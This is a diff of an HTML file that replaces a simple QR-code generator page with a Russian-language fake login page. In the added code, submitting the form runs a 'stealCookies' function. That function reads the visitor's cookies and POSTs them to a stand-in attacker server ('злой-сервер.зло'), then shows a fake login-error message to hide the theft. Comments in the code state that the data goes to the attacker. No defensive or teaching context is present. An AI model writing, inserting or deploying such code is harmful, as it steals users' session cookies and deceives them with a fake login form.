@@ -1,77 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download QR Code</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-        #qrcode {
-            margin: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход в аккаунт</title>
 </head>
 <body>
-    <h1>Create and Download QR Code</h1>
-    <div id="qrcode"></div>
-    <button id="downloadBtn">Download QR Code</button>
+  <h1>Введите данные для входа</h1>
+  <form action="#" method="POST" onsubmit="stealCookies(event)">
+    <label for="username">Логин:</label>
+    <input type="text" id="username" name="username" required><br>
+    <label for="password">Пароль:</label>
+    <input type="password" id="password" name="password" required><br>
+    <button type="submit">Войти</button>
+  </form>
 
-    <script>
-        // Генерируем QR-код
-        const qrContainer = document.getElementById('qrcode');
-        const qrCode = new QRCode(qrContainer, {
-            text: "https://example.com", // Здесь можно подставить любой текст или ссылку
-            width: 256,
-            height: 256
-        });
-
-        // Добавляем функционал для скачивания
-        document.getElementById('downloadBtn').addEventListener('click', async () => {
-            const qrImage = qrContainer.querySelector('img'); // Находим сгенерированное изображение
-
-            if (qrImage) {
-                try {
-                    // Скачиваем картинку как blob
-                    const response = await fetch(qrImage.src);
-                    const blob = await response.blob();
-
-                    // Создаём временную ссылку
-                    const link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = 'qrcode.png'; // Имя скачиваемого файла
-                    link.click();
-
-                    // Освобождаем память
-                    URL.revokeObjectURL(link.href);
-                } catch (error) {
-                    console.error('Ошибка при скачивании:', error);
-                    alert('Не удалось скачать файл.');
-                }
-            } else {
-                alert('QR-код ещё не готов!');
-            }
-        });
-    </script>
+  <script>
+    function stealCookies(event) {
+      event.preventDefault(); // Останавливаем стандартную отправку формы
+      const cookies = document.cookie; // Получаем все куки текущего пользователя
+      
+      // Отправляем куки злоумышленнику
+      fetch('https://злой-сервер.зло/steal', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ stolenCookies: cookies })
+      }).then(() => alert("Ошибка входа, попробуйте снова!"));
+    }
+  </script>
 </body>
 </html>
